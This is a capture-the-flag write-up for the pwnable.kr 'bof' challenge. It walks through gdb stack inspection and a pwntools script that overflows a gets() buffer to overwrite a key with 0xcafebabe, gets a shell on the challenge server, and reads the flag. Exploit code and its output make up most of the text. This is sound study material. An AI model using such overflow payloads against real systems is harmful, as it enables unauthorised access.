# pwnable.kr: bof

In this program,
1. The method func is called with a key of 0xdeadbeef
2. User input is then used to fill a char array via gets()
3. The key is then compared with 0xcafebabe, if it matches, we get a shell :)

We want to overwrite the value of the key to 0xcafebabe, so that the comparison succeeds. This can be done by supplying more than 32 characters when gets() read in input.

We run the program with gdb to observe the stack value
```
$ gdb bof
(gdb) break func
(gdb) run
(gdb) x/40x $esp
0xbffff300:	0x8000032e	0x00000000	0x00c30000	0x00000001
0xbffff310:	0xbffff571	0x0000002f	0xbffff36c	0x8000073a
0xbffff320:	0x80001ff4	0x800006b0	0x00000001	0x8000049d
0xbffff330:	0xb7fc73e4	0x00000016	0x80001ff4	0x800006d1
0xbffff340:	0xffffffff	0xb7e531c6	0xbffff368	0x8000069f
0xbffff350:	0xdeadbeef	0x00000000	0x800006b9	0xb7fc6ff4
0xbffff360:	0x800006b0	0x00000000	0x00000000	0xb7e394e3
0xbffff370:	0x00000001	0xbffff404	0xbffff40c	0xb7fdc858
0xbffff380:	0x00000000	0xbffff41c	0xbffff40c	0x80000000
0xbffff390:	0x800002c0	0xb7fc6ff4	0x00000000	0x00000000
```

We observe our 0xdeadbeef at 0xbffff350. We proceed with step, and input "aaaaaaaa" as test.
```
(gdb) step
Single stepping until exit from function func,
which has no line number information.
overflow me : 
aaaaaaaa
Nah..
0x8000069f in main ()
(gdb) x/40x $esp-0x50
0xbffff300:	0x800007a3	0x00000000	0x00c30000	0x00000001
0xbffff310:	0xbffff571	0x0000002f	0xbffff36c	0x61616161
0xbffff320:	0x61616161	0x80000600	0x00000001	0x8000049d
0xbffff330:	0xb7fc73e4	0x00000016	0x80001ff4	0x7763aa00
0xbffff340:	0xffffffff	0xb7e531c6	0xbffff368	0x8000069f
0xbffff350:	0xdeadbeef	0x00000000	0x800006b9	0xb7fc6ff4
0xbffff360:	0x800006b0	0x00000000	0x00000000	0xb7e394e3
0xbffff370:	0x00000001	0xbffff404	0xbffff40c	0xb7fdc858
0xbffff380:	0x00000000	0xbffff41c	0xbffff40c	0x80000000
0xbffff390:	0x800002c0	0xb7fc6ff4	0x00000000	0x00000000
```

We observe that our input of "aaaaaaaa" have been written from 0xbffff31c onwards. We want to input 13 blocks of "aaaa" followed by our 0xcafebabe in char value.

To convert hex to ascii: [http://stackoverflow.com/questions/13160309/conversion-hex-string-into-ascii-in-bash-command-line]
```
$ echo 61616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161cafebabe | xxd -r -p
```

Supply this to the program, however, it tells us that stack smashing is detected. But, the "Nah..." is still printed out! Perhaps something is wrong with the piping...
```
$ (echo 61616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161616161cafebabe | xxd -r -p) | ./bof
*** stack smashing detected ***: /home/bof/bof terminated
overflow me : 
Nah..
```

Let's try again with pwntools [http://docs.pwntools.com]
```
#!/usr/bin/python

from pwn import *

# open connection
#conn = process('./bof') # local process for debugging
conn = remote('pwnable.kr', 9000)

# prepare payload
payload = 'aaaa' * 13 + pack(0xcafebabe, 'all', 'little', True)
print 'Payload: ', payload

# send payload
print 'Sending payload...'
conn.sendline(payload)
print 'Sending ls...'
conn.sendline('ls')

# get output
print conn.recvline()
```
The ouput of ```ls``` shows us only the executable bof exist in the directory, where is the flag :( With ```ls -al``` instead, we see that the flag does exist. Let's change our ```ls``` to ```cat flag```

```
$ ./bof.py
[+] Opening connection to pwnable.kr on port 9000: Done
Payload:  aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xbe\xba\xfe�
Sending payload...
Sending ls...
daddy, I just pwned a buFFer :)

[*] Closed connection to pwnable.kr port 9000
```